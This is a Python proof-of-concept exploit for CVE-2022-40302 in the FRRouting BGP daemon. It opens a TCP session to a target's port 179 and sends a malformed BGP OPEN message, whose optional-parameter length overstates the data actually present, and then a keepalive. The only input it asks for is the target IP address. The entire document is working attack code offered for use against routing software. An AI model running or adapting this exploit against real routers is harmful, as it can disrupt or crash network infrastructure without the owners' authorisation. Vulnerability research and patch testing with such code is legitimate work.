'''
PoC for CVE-2022-40302 in FRRouting.

You only need to specify the IP address of the target as a parameter to this script.
'''
import sys        
import socket        
import signal        
        
sock = None        
        
def session(rhost):        
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)        
    s.connect((rhost, 179))        
        
    # BGP OPEN message         
    bgp_open_msg = b'\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\x00\x22\x01\x04\xde\xad\x00\x05\xc0\xa89\x01\xff\xff\x00\x02\x00\x01'  
         
    # BGP KEEPALIVE message            
    marker              = b'\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff'        
    length              = b'\x00\x13'        
    m_type              = b'\x04'            
                                                     
    keepalive_msg = marker + length + m_type       
                                                  
    print('SEND BGP OPEN')        
    s.send(bgp_open_msg)        
    keepalive = s.recv(1024)        
    
    print('SEND KEEPALIVE')    
    s.send(keepalive_msg)    
    ack = s.recv(1024)    
    
def signal_handler(signal, frame):    
    try:    
        sock.close()    
    finally:    
        sys.exit(0)    

if __name__ == '__main__':    
    if len(sys.argv) < 2:
        print('Provide the remote host IP address!')
        sys.exit(-1)
    signal.signal(signal.SIGINT, signal_handler)
    sock = session(sys.argv[1])
    while True:
        pass
